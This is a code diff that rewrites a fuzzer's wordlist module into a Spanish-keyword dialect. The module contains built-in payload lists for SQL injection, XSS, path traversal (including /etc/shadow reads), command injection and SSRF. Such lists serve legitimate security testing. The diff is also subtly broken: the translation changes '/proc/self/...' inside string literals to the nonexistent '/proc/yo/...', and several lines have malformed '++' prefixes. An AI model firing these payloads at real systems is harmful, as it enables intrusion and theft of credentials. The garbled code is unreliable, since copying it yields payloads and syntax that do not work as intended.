@@ -17,148 +17,120 @@ extern "C" fn __mn_file_read(path: String) -> String
 // Error type
 // ---------------------------------------------------------------------------
 
-pub enum WordlistError {
-    FileNotFound(String),
-    EmptyFile(String),
-    ParseError(String)
-}
++tipo WordlistError:
+    | FileNotFound(String)
+    | EmptyFile(String)
+    | ParseError(String)
 
-fn new_file_not_found(msg: String) -> WordlistError {
-    return FileNotFound(msg)
-}
+fn new_file_not_found(msg: String) -> WordlistError:
+    da FileNotFound(msg)
 
-fn new_empty_file(msg: String) -> WordlistError {
-    return EmptyFile(msg)
-}
+fn new_empty_file(msg: String) -> WordlistError:
+    da EmptyFile(msg)
 
-fn new_parse_error(msg: String) -> WordlistError {
-    return ParseError(msg)
-}
+fn new_parse_error(msg: String) -> WordlistError:
+    da ParseError(msg)
 
 // ---------------------------------------------------------------------------
 // String helpers
 // ---------------------------------------------------------------------------
 
-fn trim_line(s: String) -> String {
-    let slen: Int = len(s)
-    if slen == 0 { return s }
+fn trim_line(s: String) -> String:
+    pon slen: Int = len(s)
+    si slen == 0 { da s }
 
     // Find first non-whitespace
-    let mut start: Int = 0
-    while start < slen {
-        let ch: String = s.char_at(start)
-        if ch != " " {
-            if ch != "\t" {
-                if ch != "\r" {
-                    if ch != "\n" {
-                        break
-                    }
-                }
-            }
-        }
+    pon mut start: Int = 0
+    mien start < slen:
+        pon ch: String = s.char_at(start)
+        si ch != " ":
+            si ch != "\t":
+                si ch != "\r":
+                    si ch != "\n":
+                        sal
         start = start + 1
-    }
 
     // Find last non-whitespace
-    let mut end: Int = slen - 1
-    while end >= start {
-        let ch: String = s.char_at(end)
-        if ch != " " {
-            if ch != "\t" {
-                if ch != "\r" {
-                    if ch != "\n" {
-                        break
-                    }
-                }
-            }
-        }
+    pon mut end: Int = slen - 1
+    mien end >= start:
+        pon ch: String = s.char_at(end)
+        si ch != " ":
+            si ch != "\t":
+                si ch != "\r":
+                    si ch != "\n":
+                        sal
         end = end - 1
-    }
 
-    if start > end {
-        return ""
-    }
+    si start > end:
+        da ""
 
-    return s.substr(start, end + 1)
-}
+    da s.substr(start, end + 1)
 
-fn split_lines(content: String) -> List<String> {
-    let slen: Int = len(content)
-    let mut lines: List<String> = []
-    let mut current: String = ""
-    let mut i: Int = 0
+fn split_lines(content: String) -> List<String>:
+    pon slen: Int = len(content)
+    pon mut lines: List<String> = []
+    pon mut current: String = ""
+    pon mut i: Int = 0
 
-    while i < slen {
-        let ch: String = content.char_at(i)
-        if ch == "\n" {
+    mien i < slen:
+        pon ch: String = content.char_at(i)
+        si ch == "\n":
             lines = lines + [current]
             current = ""
-        } else if ch == "\r" {
+        sino si ch == "\r":
             // Skip \r, the \n will trigger the line break
-            if i + 1 < slen {
-                if content.char_at(i + 1) == "\n" {
+            si i + 1 < slen:
+                si content.char_at(i + 1) == "\n":
                     // \r\n pair — skip the \r, \n handled next iteration
                     i = i + 1
-                    continue
-                }
-            }
+                    sigue
             // Standalone \r
             lines = lines + [current]
             current = ""
-        } else {
+        sino:
             current = current + ch
-        }
         i = i + 1
-    }
 
     // Don't forget the last line if no trailing newline
-    if len(current) > 0 {
+    si len(current) > 0:
         lines = lines + [current]
-    }
 
-    return lines
-}
+    da lines
 
 // ---------------------------------------------------------------------------
 // load_wordlist — read file, split by newlines, trim each line
 // ---------------------------------------------------------------------------
 
-pub fn load_wordlist(path: String) -> Result<List<String>, String> {
-    let content: String = __mn_file_read(path)
-    if len(content) == 0 {
-        return Err("Failed to read wordlist file: " + path)
-    }
++fn load_wordlist(path: String) -> Result<List<String>, String>:
+    pon content: String = __mn_file_read(path)
+    si len(content) == 0:
+        da Err("Failed to read wordlist file: " + path)
 
-    let raw_lines: List<String> = split_lines(content)
-    let mut results: List<String> = []
-    let line_count: Int = len(raw_lines)
-    let mut i: Int = 0
+    pon raw_lines: List<String> = split_lines(content)
+    pon mut results: List<String> = []
+    pon line_count: Int = len(raw_lines)
+    pon mut i: Int = 0
 
-    while i < line_count {
-        let trimmed: String = trim_line(raw_lines[i])
+    mien i < line_count:
+        pon trimmed: String = trim_line(raw_lines[i])
         // Skip empty lines and comments (lines starting with #)
-        if len(trimmed) > 0 {
-            let first_ch: String = trimmed.char_at(0)
-            if first_ch != "#" {
+        si len(trimmed) > 0:
+            pon first_ch: String = trimmed.char_at(0)
+            si first_ch != "#":
                 results = results + [trimmed]
-            }
-        }
         i = i + 1
-    }
 
-    if len(results) == 0 {
-        return Err("Wordlist file is empty or contains only comments: " + path)
-    }
+    si len(results) == 0:
+        da Err("Wordlist file is empty or contains only comments: " + path)
 
-    return Ok(results)
-}
+    da Ok(results)
 
 // ---------------------------------------------------------------------------
 // builtin_sqli — SQL injection payloads
 // ---------------------------------------------------------------------------
 
-pub fn builtin_sqli() -> List<String> {
-    let mut payloads: List<String> = []
++fn builtin_sqli() -> List<String>:
+    pon mut payloads: List<String> = []
 
     // Classic OR-based
     payloads = payloads + ["' OR 1=1--"]
@@ -204,15 +176,14 @@ pub fn builtin_sqli() -> List<String> {
     payloads = payloads + ["' AND SLEEP(5)--"]
     payloads = payloads + ["1 AND (SELECT COUNT(*) FROM users) > 0"]
 
-    return payloads
-}
+    da payloads
 
 // ---------------------------------------------------------------------------
 // builtin_xss — Cross-site scripting payloads
 // ---------------------------------------------------------------------------
 
-pub fn builtin_xss() -> List<String> {
-    let mut payloads: List<String> = []
++fn builtin_xss() -> List<String>:
+    pon mut payloads: List<String> = []
 
     // Basic script tags
     payloads = payloads + ["<script>alert(1)</script>"]
@@ -254,15 +225,14 @@ pub fn builtin_xss() -> List<String> {
     payloads = payloads + ["{{constructor.constructor('alert(1)')()}}"]
     payloads = payloads + ["${alert(1)}"]
 
-    return payloads
-}
+    da payloads
 
 // ---------------------------------------------------------------------------
 // builtin_traversal — Path traversal payloads
 // ---------------------------------------------------------------------------
 
-pub fn builtin_traversal() -> List<String> {
-    let mut payloads: List<String> = []
++fn builtin_traversal() -> List<String>:
+    pon mut payloads: List<String> = []
 
     // Basic traversal
     payloads = payloads + ["../../etc/passwd"]
@@ -289,22 +259,21 @@ pub fn builtin_traversal() -> List<String> {
     // Absolute path
     payloads = payloads + ["/etc/passwd"]
     payloads = payloads + ["/etc/shadow"]
-    payloads = payloads + ["/proc/self/environ"]
-    payloads = payloads + ["/proc/self/cmdline"]
+    payloads = payloads + ["/proc/yo/environ"]
+    payloads = payloads + ["/proc/yo/cmdline"]
 
     // Null byte truncation (legacy)
     payloads = payloads + ["../../etc/passwd\0.jpg"]
     payloads = payloads + ["../../etc/passwd%00.jpg"]
 
-    return payloads
-}
+    da payloads
 
 // ---------------------------------------------------------------------------
 // builtin_command_injection — Command injection payloads
 // ---------------------------------------------------------------------------
 
-pub fn builtin_command_injection() -> List<String> {
-    let mut payloads: List<String> = []
++fn builtin_command_injection() -> List<String>:
+    pon mut payloads: List<String> = []
 
     // Semicolon chaining
     payloads = payloads + ["; ls"]
@@ -350,15 +319,14 @@ pub fn builtin_command_injection() -> List<String> {
     payloads = payloads + ["|| id"]
     payloads = payloads + ["& id"]
 
-    return payloads
-}
+    da payloads
 
 // ---------------------------------------------------------------------------
 // builtin_ssrf — Server-side request forgery payloads
 // ---------------------------------------------------------------------------
 
-pub fn builtin_ssrf() -> List<String> {
-    let mut payloads: List<String> = []
++fn builtin_ssrf() -> List<String>:
+    pon mut payloads: List<String> = []
 
     // Localhost variants
     payloads = payloads + ["http://127.0.0.1"]
@@ -395,54 +363,47 @@ pub fn builtin_ssrf() -> List<String> {
 
     // Protocol handlers
     payloads = payloads + ["file:///etc/passwd"]
-    payloads = payloads + ["file:///proc/self/environ"]
+    payloads = payloads + ["file:///proc/yo/environ"]
     payloads = payloads + ["gopher://127.0.0.1:25/"]
     payloads = payloads + ["dict://127.0.0.1:11211/"]
 
-    return payloads
-}
+    da payloads
 
 // ---------------------------------------------------------------------------
 // all_builtins — combine all built-in wordlists
 // ---------------------------------------------------------------------------
 
-pub fn all_builtins() -> List<String> {
-    let mut results: List<String> = []
++fn all_builtins() -> List<String>:
+    pon mut results: List<String> = []
 
-    let sqli: List<String> = builtin_sqli()
-    let mut i: Int = 0
-    while i < len(sqli) {
+    pon sqli: List<String> = builtin_sqli()
+    pon mut i: Int = 0
+    mien i < len(sqli):
         results = results + [sqli[i]]
         i = i + 1
-    }
 
-    let xss: List<String> = builtin_xss()
+    pon xss: List<String> = builtin_xss()
     i = 0
-    while i < len(xss) {
+    mien i < len(xss):
         results = results + [xss[i]]
         i = i + 1
-    }
 
-    let traversal: List<String> = builtin_traversal()
+    pon traversal: List<String> = builtin_traversal()
     i = 0
-    while i < len(traversal) {
+    mien i < len(traversal):
         results = results + [traversal[i]]
         i = i + 1
-    }
 
-    let cmdi: List<String> = builtin_command_injection()
+    pon cmdi: List<String> = builtin_command_injection()
     i = 0
-    while i < len(cmdi) {
+    mien i < len(cmdi):
         results = results + [cmdi[i]]
         i = i + 1
-    }
 
-    let ssrf: List<String> = builtin_ssrf()
+    pon ssrf: List<String> = builtin_ssrf()
     i = 0
-    while i < len(ssrf) {
+    mien i < len(ssrf):
         results = results + [ssrf[i]]
         i = i + 1
-    }
 
-    return results
-}
+    da results
